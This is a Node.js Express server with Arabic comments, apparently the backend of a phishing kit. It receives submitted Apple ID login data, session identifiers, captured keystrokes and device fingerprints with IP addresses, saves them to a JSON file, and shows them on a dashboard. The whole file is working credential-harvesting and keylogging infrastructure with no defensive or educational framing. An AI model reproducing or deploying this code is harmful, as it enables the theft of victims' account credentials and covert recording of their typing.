const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// تخزين البيانات في الذاكرة (يمكن استخدام قاعدة بيانات)
let database = {
    credentials: [],
    sessions: [],
    keystrokes: [],
    devices: []
};

// السماح بجميع المصادر (للتطوير فقط)
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// حفظ البيانات في ملف
function saveToFile() {
    try {
        fs.writeFileSync('data.json', JSON.stringify(database, null, 2));
    } catch (error) {
        console.error('Error saving data:', error);
    }
}

// تحميل البيانات من ملف
function loadFromFile() {
    try {
        if (fs.existsSync('data.json')) {
            database = JSON.parse(fs.readFileSync('data.json', 'utf8'));
        }
    } catch (error) {
        console.error('Error loading data:', error);
    }
}

// API لتقديم بيانات الدخول
app.post('/api/submit', (req, res) => {
    const data = req.body;
    console.log('📧 Login data received:', data.appleId);
    
    database.credentials.push({
        ...data,
        id: Date.now(),
        ip: req.ip || req.headers['x-forwarded-for'],
        timestamp: new Date().toISOString()
    });
    
    saveToFile();
    res.json({ success: true, message: 'Data received' });
});

// API لتسجيل الجلسات
app.post('/api/session', (req, res) => {
    const session = req.body;
    console.log('🎯 New session:', session.sessionId);
    
    database.sessions.push({
        ...session,
        timestamp: new Date().toISOString()
    });
    
    saveToFile();
    res.json({ success: true });
});

// API لتسجيل ضغطات المفاتيح
app.post('/api/keystrokes', (req, res) => {
    const keystrokes = req.body;
    
    database.keystrokes.push(...keystrokes);
    
    // الاحتفاظ فقط بآخر 10000 ضغطة
    if (database.keystrokes.length > 10000) {
        database.keystrokes = database.keystrokes.slice(-10000);
    }
    
    saveToFile();
    res.json({ success: true, count: keystrokes.length });
});

// API للحصول على جميع البيانات
app.get('/api/data', (req, res) => {
    res.json({
        credentials: database.credentials,
        sessions: database.sessions,
        keystrokes: database.keystrokes.slice(-500), // آخر 500 ضغطة فقط
        stats: {
            totalCredentials: database.credentials.length,
            totalSessions: database.sessions.length,
            totalKeystrokes: database.keystrokes.length
        }
    });
});

// API لحذف البيانات
app.delete('/api/data', (req, res) => {
    database = { credentials: [], sessions: [], keystrokes: [], devices: [] };
    saveToFile();
    res.json({ success: true });
});

// API لتسجيل الجهاز
app.post('/api/device', (req, res) => {
    const device = req.body;
    
    // تحقق إذا كان الجهاز مسجلاً مسبقاً
    const existingIndex = database.devices.findIndex(d => 
        d.userAgent === device.userAgent && d.ip === device.ip
    );
    
    if (existingIndex === -1) {
        database.devices.push({
            ...device,
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString()
        });
    } else {
        database.devices[existingIndex].lastSeen = new Date().toISOString();
    }
    
    saveToFile();
    res.json({ success: true });
});

// API لفحص حالة الخادم
app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        stats: {
            credentials: database.credentials.length,
            sessions: database.sessions.length,
            keystrokes: database.keystrokes.length,
            devices: database.devices.length
        }
    });
});

// تقديم الملفات الثابتة
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// تحميل البيانات عند بدء التشغيل
loadFromFile();

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
});
